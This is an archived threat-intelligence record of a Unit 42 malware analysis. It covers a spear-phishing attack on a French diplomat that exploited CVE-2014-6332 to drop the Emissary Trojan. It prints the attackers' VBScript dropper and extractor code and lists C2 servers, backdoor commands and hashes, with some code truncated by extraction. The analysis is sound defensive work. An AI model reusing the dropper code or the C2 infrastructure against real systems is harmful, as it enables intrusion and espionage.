{
    "id": "62769575-a8f9-4f9d-9bd5-720e902dad32",
    "created_at": "2022-10-25T16:48:12.127879Z",
    "updated_at": "2025-03-27T02:13:48.685325Z",
    "deleted_at": null,
    "sha1_hash": "b2e67b0e7e9ca99cc9a37f0d1b7603fdf0365a53",
    "title": "Attack on French Diplomat Linked to Operation Lotus Blossom - Palo Alto Networks BlogPalo Alto Networks Blog",
    "authors": "",
    "file_creation_date": "2015-12-22T10:47:57Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 513392,
    "plain_text": "### 18\n\n\n**support group event.**\n\n**The actors attempted to exploit CVE-2014-6332 using a slightly modified version of the proof-of-**\n\n**concept (POC) code to install a Trojan called Emissary, which is related to the Operation Lotus**\n\n**Blossom campaign. The TTPs used in this attack also match those detailed in the paper. The**\n\n**targeting of this individual suggests the actors are interested in breaching the French Ministry of**\n\n**Foreign Affairs itself or gaining insights into relations between France and Taiwan.**\n\n**[We have created the Emissary tag for AutoFocus users to track this threat.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary)**\n\n**On November 10, 2015, threat actors sent a spear-phishing email to an individual at the French**\n\n**Ministry of Foreign Affairs. The subject and the body of the email suggest the targeted individual**\n\n**had been invited to a Science and Technology conference in Hsinchu, Taiwan. The e-mail**\n\n**appears quite timely, as the conference was held on November 13, 2015, which is three days**\n\n**after the attack took place.**\n\n**The email body contained a link to the legitimate registration page for the conference, but the**\n\n**email also had two attachments with the following filenames that also pertain to the conference:**\n\n|Col1|POSTED BY: Robert Falcone and Jen Miller-Osborn on December 18, 2015 9:10 AM|\n|---|---|\n|18||\n|LLiikkee|FILED IN: Malware, Threat Prevention, Unit 42 TAGGED: AutoFocus, email, Emissary, Lotus Blossom, spearphishing We observed a targeted attack in November directed at an individual working for the French Ministry of Foreign Affairs. The attack involved a spear-phishing email sent to a single French diplomat based in Taipei, Taiwan and contained an invitation to a Science and Technology|\n|Tweet||\n|1||\n\n\n**Get Updates**\n**Sign up to receive the latest news, cyber**\n**threat intelligence and research from Unit**\n**42.**\n\n**Business Email**\n\n**Submit**\n\n\n**LikeLike**\n\n\n**1.** **蔡英[⽂柯建銘全國科技後援會邀請函]**\n\n\n**.doc (translates to “Tsai Ker Chien-ming National**\n\n\n## 1\n\n\n**Science and Technology Support Association invitations.doc”)**\n\n**2.** **書⾯[報名表格].doc (translates to “Written Application Form.doc”)**\n\n**Both attachments are malicious Word documents that attempt to exploit the Windows OLE**\n\n**[Automation Array Remote Code Execution Vulnerability tracked by CVE-2014-6332. Upon](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6332)**\n\n**successful exploitation, the attachments will install a Trojan named Emissary and open a Word**\n\n**document as a decoy.**\n\n**The first attachment opens a decoy (Figure 2) that is a copy of an invitation to a Science and**\n\n**Technology conference this past November 13th held in Hsingchu, Taiwan, while the second**\n\n**opens a decoy (Figure 1) that is a registration form to attend the conference. The conference**\n\n**was widely advertised online and on Facebook, however in this case the invitation includes a**\n\n**detailed itinerary that does not seem to have appeared online. The Democratic Progressive’s**\n\n**Party (DPP) Chairwoman Tsai Ing-wen and DPP caucus whip and Hsinchu representative Ker**\n\n**Chien-ming were the primary political sponsors of the conference and are longtime political**\n\n**allies. Tsai Ing-wen is the current front-runner for the Taiwanese Presidency and Ker Chien-ming**\n\n**may become Speaker if she wins. The conference focused on using open source technology,**\n\n**open international recruiting, and partnerships to continue developing Hsinchu as the Silicon**\n\n**Valley of Taiwan. It particularly noted France as an ally in this, and France is Taiwan’s second**\n\n**largest technology partner and fourth largest trading partner in Europe.**\n\n\n**Select a Category**\n\n**Select a Month**\n\n**[MORE →](http://researchcenter.paloaltonetworks.com/archives/)**\n\n\n-----\n\n**_Figure 2 Decoy document containing the invitation and agenda for event_**\n\n**[The threat actors attempted to exploit CVE-2014-6332 using the POC code available in the wild.](https://gist.github.com/worawit/77a839e3e5ca50916903)**\n\n**The POC code contains inline comments that explain how the malicious VBScript exploits this**\n\n**vulnerability, so instead of discussing the malicious script or exploit itself, we will focus on the**\n\n**portions of the script that the threat actors modified.**\n\n**The actors removed the explanatory comments from the VBScript and made slight modifications**\n\n**to the POC code. The only major functional difference between the POC and the VBScript**\n\n**involved adding the ability to extract and run both a decoy document and payload. Figure 3 and**\n\n**4 compare the differing “runshell” command within the POC and the malicious documents used**\n\n**in this attack. The code in Figure 3 shows that the POC does nothing more than launch the**\n\n**notepad.exe application upon successful exploitation. Figure 4 shows the malicious document**\n\n**creating a file named “ss.vbs” that it writes a VBScript to using a series of “echo” statements.**\n\n**After writing the VBScript, the malicious document executes the “ss.vbs” file.**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n\n\n**function** **runshell()**\n**On Error Resume Next**\n**set shell=createobject(\"Shell.Application\")**\n**shell.ShellExecute** **\"notepad.exe\"**\n**end** **function**\n\n\n**_Figure 3 Code block containing “runshell” function in CVE-2014-6332 proof-of-concept VBScript_**\n\n\n-----\n\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n**19**\n**20**\n**21**\n**22**\n**23**\n**24**\n**25**\n**26**\n**27**\n**28**\n**29**\n**30**\n**31**\n**32**\n**33**\n**34**\n**35**\n**36**\n**37**\n**38**\n**39**\n**40**\n**41**\n**42**\n**43**\n**44**\n**45**\n**46**\n**47**\n**48**\n**49**\n**50**\n**51**\n**52**\n**53**\n**54**\n**55**\n**56**\n**57**\n**58**\n**59**\n**60**\n**61**\n**62**\n**63**\n**64**\n**65**\n**66**\n**67**\n**68**\n**69**\n**70**\n**71**\n**72**\n**73**\n**74**\n**75**\n**76**\n**77**\n**78**\n**79**\n**80**\n\n\n**j** **j** **(** **p** **)**\n**strValue = objshell.RegRead(\"HKCU\\Software\\Microsoft\\Windows\\Curr**\n**ename = \"rundll32\"\",\"\"\"\"\"\"\"&strValue&\"\\mm.dll\"\"\"\",Setting\"**\n**outfile1= strValue&\"\\mm.dll\"**\n**bs = strValue&\"\\ss.vbs\"**\n**dn= strValue&\"\\t.doc\"**\n**v=window.location.href**\n**v=Replace(v,\"file:///\",\"\",1,1,1)**\n**v=Replace(v,\"?.html\",\"\",1,1,1)**\n**v=Replace(v,\"%20\",\" \",1)**\n**v=Replace(v,\"/\",\"\\\",1)**\n**cmd = \"cmd\"**\n**arg=\" /c** **taskkill -f -im winword.exe** **\"**\n**arg1= \"\"\",\"\"\"**\n**set shell=createobject(\"wscript.shell\")**\n**shell.run \"cmd.exe /c** **\"\"echo On Error Resume Next >\"\"\"&bs&\"\"\"** **\"\"**\n**shell.run \"cmd.exe /c** **\"\"echo set shell=createobject(\"\"Shell.Appli**\n**shell.run \"cmd.exe /c** **\"\"echo shell.ShellExecute** **\"\"cmd\"\",\"\"\"&arg&\"**\n**shell.run \"cmd.exe /c** **\"\"echo wscript.sleep** **3000       >> \"\"**\n**shell.run \"cmd.exe /c** **\"\"echo dim str**\n**shell.run \"cmd.exe /c** **\"\"echo dim L1**\n**shell.run \"cmd.exe /c** **\"\"echo dim L2**\n**shell.run \"cmd.exe /c** **\"\"echo dim Len**\n**shell.run \"cmd.exe /c** **\"\"echo dim infile**\n**shell.run \"cmd.exe /c** **\"\"echo dim outfile1**\n**shell.run \"cmd.exe /c** **\"\"echo dim outfile2**\n**shell.run \"cmd.exe /c** **\"\"echo infile = \"\"\"&v&\"\"\"**\n**shell.run \"cmd.exe /c** **\"\"echo outfile1 = \"\"\"&outfile1&\"\"\"**\n**shell.run \"cmd.exe /c** **\"\"echo outfile2 = \"\"\"&dn&\"\"\"**\n**shell.run \"cmd.exe /c** **\"\"echo L1=   78924**\n**shell.run \"cmd.exe /c** **\"\"echo L2=   38912**\n**shell.run \"cmd.exe /c** **\"\"echo size=  144893**\n**shell.run \"cmd.exe /c** **\"\"echo offset1 = size-L1-L2**\n**shell.run \"cmd.exe /c** **\"\"echo offset2 = size-L2**\n**shell.run \"cmd.exe /c** **\"\"echo Len=0**\n**shell.run \"cmd.exe /c** **\"\"echo str = ReadBinary** **(infile,L1,offset1)**\n**shell.run \"cmd.exe /c** **\"\"echo WriteBinary outfile1,** **str**\n**shell.run \"cmd.exe /c** **\"\"echo str = ReadBinary** **(infile,L2,offset2)**\n**shell.run \"cmd.exe /c** **\"\"echo WriteBinary outfile2,** **str**\n**shell.run \"cmd.exe /c** **\"\"echo Function** **ReadBinary(FileName,length,**\n**shell.run \"cmd.exe /c** **\"\"echo  Dim Buf(),** **I**\n**shell.run \"cmd.exe /c** **\"\"echo  With CreateObject(\"\"ADODB.Stream\"\"**\n**shell.run \"cmd.exe /c** **\"\"echo** **.Mode = 3: .Type = 1: .Open: .Loa**\n**shell.run \"cmd.exe /c** **\"\"echo   Len =length -1**\n**shell.run \"cmd.exe /c** **\"\"echo   ReDim Buf(Len)**\n**shell.run \"cmd.exe /c** **\"\"echo   For** **I = 0** **To** **Len: if(I=0)** **then**\n**shell.run \"cmd.exe /c** **\"\"echo   Next           >> \"\"\"**\n**shell.run \"cmd.exe /c** **\"\"echo** **.Close**\n**shell.run \"cmd.exe /c** **\"\"echo  End** **With**\n**shell.run \"cmd.exe /c** **\"\"echo  ReadBinary = Buf**\n**shell.run \"cmd.exe /c** **\"\"echo End** **Function**\n**shell.run \"cmd.exe /c** **\"\"echo Sub WriteBinary(FileName,** **Buf)**\n**shell.run \"cmd.exe /c** **\"\"echo  Dim** **I,** **aBuf,** **Size,** **bStream**\n**shell.run \"cmd.exe /c** **\"\"echo  Size = UBound(Buf): ReDim aBuf(Siz**\n**shell.run \"cmd.exe /c** **\"\"echo  For** **I = 0** **To** **Size - 1** **Step** **2**\n**shell.run \"cmd.exe /c** **\"\"echo    aBuf(I** **\\** **2) = ChrW(Buf(I + 1) ***\n**shell.run \"cmd.exe /c** **\"\"echo  Next**\n**shell.run \"cmd.exe /c** **\"\"echo  If** **I = Size Then** **aBuf(I** **\\** **2) = ChrW**\n**shell.run \"cmd.exe /c** **\"\"echo  aBuf=Join(aBuf,** **\"\"\"\")**\n**shell.run \"cmd.exe /c** **\"\"echo  Set bStream = CreateObject(\"\"ADODB**\n**shell.run \"cmd.exe /c** **\"\"echo  bStream.Type = 1: bStream.Open**\n**shell.run \"cmd.exe /c** **\"\"echo  With CreateObject(\"\"ADODB.Stream\"\"**\n**shell.run \"cmd.exe /c** **\"\"echo** **.Type = 2 : .Open: .WriteText aB**\n**shell.run \"cmd.exe /c** **\"\"echo** **.Position = 2: .CopyTo bStream:**\n**shell.run \"cmd.exe /c** **\"\"echo  End** **With**\n**shell.run \"cmd.exe /c** **\"\"echo  bStream.SaveToFile FileName,** **2: bS**\n**shell.run \"cmd.exe /c** **\"\"echo  Set bStream = Nothing**\n**shell.run \"cmd.exe /c** **\"\"echo End** **Sub**\n**shell.run \"cmd.exe /c** **\"\"echo set shell=createobject(\"\"Shell.Appli**\n**shell.run \"cmd.exe /c** **\"\"echo shell.ShellExecute** **\"\"\"&dn&\"\"\" >>\"\"\"&**\n**shell.run \"cmd.exe /c** **\"\"echo shell.ShellExecute** **\"\"\"&ename&\"\"\" >>\"**\n**shell.run \"cmd.exe /c** **\"\"echo Set xa = CreateObject(\"\"Scripting.Fi**\n**shell.run \"cmd.exe /c** **\"\"echo If** **xa.FileExists(\"\"\"&bs&\"\"\")** **Then**\n**shell.run \"cmd.exe /c** **\"\"echo Set xb = xa.GetFile(\"\"\"&bs&\"\"\")**\n**shell.run \"cmd.exe /c** **\"\"echo xb.Delete**\n**shell.run \"cmd.exe /c** **\"\"echo End** **If**\n**shell.run \"cmd.exe /c** **\"\"\"&bs&\"\"\"** **\",0,true**\n**end** **function**\n\n\n**_Figure 4 Code block containing “runshell” function in malicious VBScript within attachment_**\n\n**The ss.vbs file is responsible for locating the payload and decoy document from the initial**\n\n**malicious document, as well as decrypting, saving and opening both of the files. The script has**\n\n**hardcoded offsets to the location of both the payload and decoy document within the initial**\n\n**document. The script will decrypt both of the embedded files using a two-byte XOR loop that**\n\n**skips the first byte and then decrypts the remaining using “A” and “C” as the key. After**\n\n**decrypting the embedded files, the script saves the decoy to “t.doc” and the payload to “mm.dll”**\n\n**in the “%APPDATA%\\LocalData” folder. Finally, the script will open the decoy document and**\n\n**launch the payload by calling its exported function named “Setting”.**\n\n\n-----\n\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n**17**\n**18**\n**19**\n**20**\n**21**\n**22**\n**23**\n**24**\n**25**\n**26**\n**27**\n**28**\n**29**\n**30**\n**31**\n**32**\n**33**\n**34**\n**35**\n**36**\n**37**\n**38**\n**39**\n**40**\n**41**\n**42**\n**43**\n**44**\n**45**\n**46**\n**47**\n**48**\n**49**\n**50**\n**51**\n**52**\n**53**\n**54**\n**55**\n**56**\n**57**\n**58**\n**59**\n**60**\n**61**\n\n\n**,** **,** **,** **,**\n**wscript.sleep** **3000**\n**dim str**\n**dim L1**\n**dim L2**\n**dim Len**\n**dim infile**\n**dim outfile1**\n**dim outfile2**\n**infile = \"C:\\Documents and Settings\\<username>\\Desktop\\<malicious d**\n**outfile1 = \"C:\\Documents and Settings\\<username>\\Local Settings\\App**\n**outfile2 = \"C:\\Documents and Settings\\<username>\\Local Settings\\App**\n**L1=   78924**\n**L2=   38912**\n**size=  144893**\n**offset1 = size-L1-L2**\n**offset2 = size-L2**\n**Len=0**\n**str = ReadBinary** **(infile,L1,offset1)**\n**WriteBinary outfile1,** **str**\n**str = ReadBinary** **(infile,L2,offset2)**\n**WriteBinary outfile2,** **str**\n**Function** **ReadBinary(FileName,length,offset)**\n**Dim Buf(),** **I**\n**With CreateObject(\"ADODB.Stream\")**\n**.Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position**\n**Len =length -1**\n**ReDim Buf(Len)**\n**For** **I = 0** **To** **Len: if(I=0)** **then** **Buf(I)=(AscB(.Read(1)))** **else** **if**\n**Next**\n**.Close**\n**End** **With**\n**ReadBinary = Buf**\n**End** **Function**\n**Sub WriteBinary(FileName,** **Buf)**\n**Dim** **I,** **aBuf,** **Size,** **bStream**\n**Size = UBound(Buf): ReDim aBuf(Size** **\\** **2)**\n**For** **I = 0** **To** **Size - 1** **Step** **2**\n**aBuf(I** **\\** **2) = ChrW(Buf(I + 1) * 256 + Buf(I))**\n**Next**\n**If** **I = Size Then** **aBuf(I** **\\** **2) = ChrW(Buf(I))**\n**aBuf=Join(aBuf,** **\"\")**\n**Set bStream = CreateObject(\"ADODB.Stream\")**\n**bStream.Type = 1: bStream.Open**\n**With CreateObject(\"ADODB.Stream\")**\n**.Type = 2 : .Open: .WriteText aBuf**\n**.Position = 2: .CopyTo bStream: .Close**\n**End** **With**\n**bStream.SaveToFile FileName,** **2: bStream.Close**\n**Set bStream = Nothing**\n**End** **Sub**\n**set shell=createobject(\"Shell.Application\")**\n**shell.ShellExecute** **\"C:\\Documents and Settings\\<username>\\Local Sett**\n**shell.ShellExecute** **\"rundll32\",\"\"\"C:\\Documents and Settings\\<usernam**\n**Set xa = CreateObject(\"Scripting.FileSystemObject\")**\n**If** **xa.FileExists(\"C:\\Documents and Settings\\<username>\\Local Settin**\n**Set xb = xa.GetFile(\"C:\\Documents and Settings\\<username>\\Local Set**\n**xb.Delete**\n**End** **If**\n\n\n**_Figure 5 VBScript within ss.vbs responsible for extracting and running the payload and decoy_**\n\n**The payload of this attack is a Trojan that we track with the name Emissary. This Trojan is**\n\n**[related to the Elise backdoor described in the Operation Lotus Blossom report. Both Emissary](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)**\n\n**and Elise are part of a malware group referred to as “LStudio”, which is based on the following**\n\n**debug strings found in Emissary and Elise samples:**\n\n**d:\\lstudio\\projects\\worldclient\\emissary\\Release\\emissary\\i386\\emissary.pdb**\n\n**d:\\lstudio\\projects\\lotus\\elise\\Release\\EliseDLL\\i386\\EliseDLL.pdb**\n\n**There is code overlap between Emissary and Elise, specifically in the use of a common function**\n\n**to log debug messages to a file and a custom algorithm to decrypt the configuration file. The**\n\n**custom algorithm used by Emissary and Elise to decrypt their configurations use the “srand”**\n\n**function to set a seed value for the “rand” function, which the algorithm uses to generate a key.**\n\n**While the “rand” function is meant to generate random numbers, the malware author uses the**\n\n**“srand” function to seed the “rand” function with a static value. The static seed value causes the**\n\n**“rand” function to create the same values each time it is called and results in a static key to**\n\n**decrypt the configuration. The seed value is where the Emissary and Elise differ in their use of**\n\n**this algorithm, as Emissary uses a seed value of 1024 (as seen in Figure 6) and Elise uses the**\n\n**seed value of 2012.**\n\n\n-----\n\n**_Figure 6 Custom algorithm in Emissary using ‘srand’ and ‘rand’ with 1024 as a seed value_**\n\n**While these two Trojans share code, we consider Emissary and Elise separate tools since their**\n\n**configuration structure, command handler and C2 communications channel differ. The Emissary**\n\n**Trojan delivered in this attack contains the components listed in Table 1. At a high level,**\n\n**Emissary has an initial loader DLL that extracts a configuration file and a second DLL containing**\n\n**Emissary’s functional code that it injects into Internet Explorer.**\n\n**MD5** **Path** **Description**\n\n**06f1d2be5e981dee056c231d184db908** **%APPDATA%\\LocalData\\ishelp.dll** **Loader**\n\n**6278fc8c7bf14514353797b229d562e8** **%APPDATA%\\LocalData\\A08E81B411.DAT** **Emissary**\n\n**Payload**\n\n**e9f51a4e835929e513c3f30299567abc** **%APPDATA%\\LocalData\\75BD50EC.DAT** **Configuration**\n\n**file**\n\n**varies** **%TEMP%\\000A758C8FEAE5F.TMP** **Log file**\n\n**_Table 1 Dropped files associated with Emissary Trojan seen in attack on French Ministry of_**\n\n**_Foreign Affairs_**\n\n**The loader Trojan named “ishelp.dll” had an original name of “Loader.dll”, which will extract the**\n\n**Emissary payload from a resource named “asdasdasdasdsad” and write it to a file named**\n\n**“A08E81B411.DAT”. The loader will then write an embedded configuration to a file named**\n\n**“75BD50EC.DAT”. The loader Trojan creates a mutex named**\n\n**“_MICROSOFT_LOADER_MUTEX_” and finishes by injecting the Emissary DLL in**\n\n**“A08E81B411.DAT” into a newly spawned Internet Explorer process.**\n\n**The Emissary Trojan runs within the Internet Explorer process. It begins by reading and**\n\n**decrypting its configuration file, which has the following structure:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n\n\n**struct** **emissary_config** **{**\n**WORD** **emissary_version_major;**\n**WORD** **emissary_version_minor;**\n**CHAR[36]** **GUID_for_sample;**\n**WORD** **Unknown1;**\n**CHAR[128]** **Server1;**\n**CHAR[128]** **Server2;**\n**CHAR[128]** **Server3;**\n**CHAR[128]** **CampaignName;**\n**CHAR[550]** **Unknown2;**\n**WORD** **Delay_interval_seconds;**\n**};**\n\n\n**We decrypted and parsed the configuration file that accompanied the payload used in this**\n\n**attack, which resulted in the following settings:**\n\n**Version: 5.3**\n\n**GUID: ba87c1c5-f71c-4a8b-b511-07aa113d9103**\n\n**C2 Server 1: http://ustar5.PassAs[.]us/default.aspx**\n\n**C2 Server 2: http://203.124.14.229/default.aspx**\n\n**C2 Server 3: http://dnt5b.myfw[.]us/default.aspx**\n\n**Campaign Code: UPG-ZHG-01**\n\n**Sleep Delay: 300**\n\n**After decrypting the configuration file, Emissary interacts with its command and control (C2)**\n\n**servers using HTTP or HTTPS, depending on the protocol specified in the configuration file. The**\n\n**initial network beacon sent from Emissary to its C2 server, seen in Figure 7, includes a Cookie**\n\n**field that contains a “GUID”, “op” and “SHO” field. The GUID field is a unique identifier for the**\n\n**compromised system that is obtained directly from the configuration file. The op field has a value**\n\n**of “101”, which is a static value that represents the initial network beacon. The SHO field**\n\n**contains the external IP address of the infected system, which Emissary obtains from a**\n\n**legitimate website “showip.net”, specifically parsing the website’s response for ‘<input**\n\n**id=”checkip” type=”text” name=”check_ip” value=’, which contains the IP address of the system.**\n\n**_Figure 7 Network beacon sent from Emissary Trojan to C2 server_**\n\n\n-----\n\n**GUID value. The Emissary Trojan will use this GUID value provided by the C2 server as an**\n\n**encryption key that it will use to encrypt data sent in subsequent network communications.**\n\n**_Figure 8 C2 response to Emissary beacon_**\n\n**The C2 server provides commands to the Trojan as a three digit numeric string within the data**\n\n**portion of the HTTP response (in the form of “op=<command>”), which the Emissary Trojan will**\n\n**decrypt and compare to a list of commands within its command handler. The command handler**\n\n**function within the Emissary Trojan supports six commands, as seen in Table 2.**\n\n**Command** **Description**\n\n**102** **Upload a file to the C2 server.**\n\n**103** **Executes a specified command.**\n\n**104** **Download file from the C2 server.**\n\n**105** **Update configuration file.**\n\n**106** **Create a remote shell.**\n\n**107** **Updates the Trojan with a new**\n\n**executable.**\n\n**_Table 2 Command handler within Emissary version 5.3_**\n\n**If the command issued from the C2 server does not match the one listed in the Trojan saves the**\n\n**message “unkown:%s” to the log file. The command set available within Emissary allows the**\n\n**threat actors backdoor access to a compromised system. Using this access, the threat actors**\n\n**can exfiltrate data and carry out further activities on the system, including interacting directly**\n\n**with the system’s command shell and downloading and executing additional tools for further**\n\n**functionality.**\n\n**The infrastructure associated with the Emissary C2 servers used in this attack includes**\n\n**ustar5.PassAs[.]us, 203.124.14.229 and dnt5b.myfw[.]us. The infrastructure is rather isolated as**\n\n**the only overlap in domains includes appletree.onthenetas[.]com. The overlap, as seen in**\n\n**Figure 9 involves two IP addresses that during the same time frame resolved both the**\n\n**appletree.onthenetas[.]com domain and the Emissary C2 domain of ustar5.PassAs[.]us. The**\n\n**other C2 domain used by this Emissary payload, specifically dnt5b.myfw[.]us currently resolves**\n\n**to the 127.0.0.1. This provides another glimpse into TTPs for these threat actors, as it suggests**\n\n**that the threat actors set the secondary C2 domains to resolve to the localhost IP address to**\n\n**avoid network detection and change this to a routable IP address when they need the C2 server**\n\n**operational. Additionally, while this infrastructure does not overlap with that used in Operation**\n\n**Lotus Blossom, that also fits with the TTPs. In each case, the threat actors used separate**\n\n**infrastructure for different targets, another way to help avoid detection.**\n\n\n-----\n\n**_Figure 9 Infrastructure associated with Emissary Trojan_**\n\n**APT threat actors, most likely nation state-sponsored, targeted a diplomat in the French Ministry**\n\n**of Foreign Affairs with a seemingly legitimate invitation to a technology conference in Taiwan. It**\n\n**is entirely possible the diplomat was truly invited to the conference, or at least would not have**\n\n**been surprised by the invitation, adding to the likelihood the attachment would have been**\n\n**opened. The actors were attempting to exploit CVE-2014-6332 to install a new version of the**\n\n**Emissary Trojan, specifically version 5.3.**\n\n**[The Emissary Trojan is related to the Elise malware used in Operation Lotus Blossom, which](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)**\n\n**was an attack campaign on targets in Southeast Asia, in many cases also with official looking**\n\n**decoy documents that do not appear to have been available online. Additionally, the targeting of**\n\n**a French diplomat based in Taipei, Taiwan aligns with previous targeting by these actors, as**\n\n**does the separate infrastructure. Based on the targeting and lures, Unit 42 assesses that the**\n\n**threat actors’ collection requirements not only include militaries and government agencies in**\n\n**Southeast Asia, but also nations involved in diplomatic and trade agreements with them.**\n\n**Related Hashes**\n\n\n**748feae269d561d80563eae551ef7bfd -書⾯[報名表格].doc**\n\n**9fd6f702763a9840bd1b3a898eb9c62d -蔡英[⽂柯建銘全國科技後援會邀請函]**\n\n**06f1d2be5e981dee056c231d184db908 – ishelp.dll**\n\n**6278fc8c7bf14514353797b229d562e8 – A08E81B411.DAT**\n\n**e9f51a4e835929e513c3f30299567abc – 75BD50EC.DAT**\n\n**Command and Control**\n\n**203.124.14.229**\n\n**ustar5.PassAs[.]us**\n\n**appletree.onthenetas[.]com**\n\n**dnt5b.myfw[.]us**\n\n\n**.doc**\n\n\n-----\n\n**December 20, 2015 1:01 PM**\n## Attack on French Diplomat Linked to Operation Lotus Blossom | vyagers\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.12.18.Attack_on_Frence_Diplomat_Linked_To_Operation_Lotus_Blossom/attack-on-french-diplomat-linked-to-operation-lotus-blossom.pdf"
    ],
    "report_names": [
        "attack-on-french-diplomat-linked-to-operation-lotus-blossom"
    ],
    "threat_actors": [
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a1ce86c2-3efc-4115-a85e-92c5fa461838",
            "created_at": "2022-10-25T16:47:55.561071Z",
            "updated_at": "2025-03-27T02:05:17.261424Z",
            "deleted_at": null,
            "main_name": "BRONZE ELGIN",
            "aliases": [
                "Lotus Blossom ",
                "Lotus Panda ",
                "Lstudio",
                "Spring Dragon ",
                "CTG-8171 "
            ],
            "source_name": "Secureworks:BRONZE ELGIN",
            "tools": [
                " Lzari",
                "Elise"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2fa14cf4-969f-48bc-b68e-a8e7eedc6e98",
            "created_at": "2022-10-25T15:50:23.538608Z",
            "updated_at": "2025-03-27T02:00:55.495551Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "Lotus Blossom",
                "DRAGONFISH",
                "Spring Dragon",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "MITRE:Lotus Blossom",
            "tools": [
                "Elise"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "eaa8168f-3fab-4831-aa60-5956f673e6b3",
            "created_at": "2022-10-25T16:07:23.805824Z",
            "updated_at": "2025-03-27T02:02:09.986613Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "ATK 1",
                "ATK 78",
                "Billbug",
                "Bronze Elgin",
                "CTG-8171",
                "Dragonfish",
                "Lotus Blossom",
                "Operation Lotus Blossom",
                "Red Salamander",
                "Spring Dragon",
                "Thrip"
            ],
            "source_name": "ETDA:Lotus Blossom",
            "tools": [
                "BKDR_ESILE",
                "Catchamas",
                "EVILNEST",
                "Elise",
                "Group Policy Results Tool",
                "Hannotog",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "PsExec",
                "Rikamanu",
                "Sagerunex",
                "Spedear",
                "Syndicasec",
                "WMI Ghost",
                "Wimmie",
                "gpresult"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "87a20b72-ab72-402f-9013-c746c8458b0b",
            "created_at": "2023-01-06T13:46:38.293223Z",
            "updated_at": "2025-03-27T02:00:02.796483Z",
            "deleted_at": null,
            "main_name": "LOTUS PANDA",
            "aliases": [
                "Lotus BLossom",
                "Spring Dragon",
                "ST Group",
                "DRAGONFISH",
                "BRONZE ELGIN",
                "ATK1",
                "G0030",
                "Red Salamander"
            ],
            "source_name": "MISPGALAXY:LOTUS PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041628,
    "ts_creation_date": 1450781277,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/b2e67b0e7e9ca99cc9a37f0d1b7603fdf0365a53.pdf",
        "text": "https://archive.orkl.eu/b2e67b0e7e9ca99cc9a37f0d1b7603fdf0365a53.txt",
        "img": "https://archive.orkl.eu/b2e67b0e7e9ca99cc9a37f0d1b7603fdf0365a53.jpg"
    }
}